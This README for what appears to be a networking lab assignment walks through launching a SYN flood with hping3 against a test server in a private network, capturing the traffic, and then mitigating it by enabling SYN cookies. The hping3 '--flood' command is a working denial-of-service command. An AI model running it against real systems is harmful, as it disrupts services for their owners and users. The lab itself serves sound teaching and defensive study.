# Task 2
# SYN Flood Attack Implementation and Mitigation

## Overview
This project demonstrates the implementation and mitigation of a SYN flood attack in a controlled virtual environment. It uses a client-server model where the server modifies Linux kernel parameters to simulate an attack, and the client generates legitimate and attack traffic. The impact is analyzed using packet captures and a Python script to visualize connection durations.

---

## Steps for Implementation

### **Task A: SYN Flood Attack**

#### **Server (Victim) - 192.168.29.178**
1. **Modify Linux kernel parameters** to allow SYN flood attack:
   ```bash
   sudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096
   sudo sysctl -w net.ipv4.tcp_syncookies=0
   sudo sysctl -w net.ipv4.tcp_synack_retries=1
   ```
2. **Start a listening server** on port 4444:
   ```bash
   nc -l -p 4444
   ```
3. **Start packet capture** on the server:
   ```bash
   sudo tcpdump -i eth0 port 4444 -w attack.pcap
   ```

#### **Client (Attacker) - Any machine**
1. **Start normal traffic**:
   ```bash
   sudo hping3 -S -p 4444 192.168.29.178
   ```
2. **After 20 seconds, launch SYN flood attack**:
   ```bash
   sudo hping3 -S -p 4444 --flood 192.168.29.178
   ```
3. **Stop the attack after 100 seconds**, then stop normal traffic after another 20 seconds.
4. **Stop packet capture on the server**:
   ```bash
   Ctrl + C (to stop tcpdump)
   ```

5. **Extract connection details from the packet capture**:
   ```bash
   tshark -r attack.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e frame.time_epoch -e tcp.flags.syn -e tcp.flags.ack -e tcp.flags.fin -e tcp.flags.reset -E header=y -E separator=, -E quote=d > connections.csv
   ```

---

### **Task B: SYN Flood Attack Mitigation**

#### **Enable SYN Cookies on the Server**
1. **Apply mitigation by enabling SYN cookies**:
   ```bash
   sudo sysctl -w net.ipv4.tcp_syncookies=1
   ```
2. **Repeat the attack experiment following the same steps from Task A.**

---

## **Analyzing the Results**
1. **Run the Python script to generate the connection duration graph:**
   ```bash
   python3 graph.py
   ```
2. **Compare the connection duration before and after mitigation.**
3. **Use Wireshark to verify packet behavior and analyze the results.**

---

## **Attached Images**
The following images provide visual confirmation of the experiment:

### **Task A: SYN Flood Attack (Before Mitigation)**
- `taskA_wireshark.png`: Screenshot of the packet capture in Wireshark.
- `taskA_graph.png`: Graph generated from the Python script analyzing connection durations.

### **Task B: SYN Flood Attack Mitigation (After Mitigation)**
- `taskB_wireshark.png`: Screenshot of the packet capture in Wireshark after enabling SYN cookies.
- `taskB_graph.png`: Graph generated from the Python script after mitigation.

These images are attached in the `Task2` directory for reference.

---

## **Expected Outcome**
- Without mitigation: SYN flood attack exhausts resources, causing dropped connections.
- With mitigation: The server resists the attack using SYN cookies, allowing legitimate connections to continue functioning.
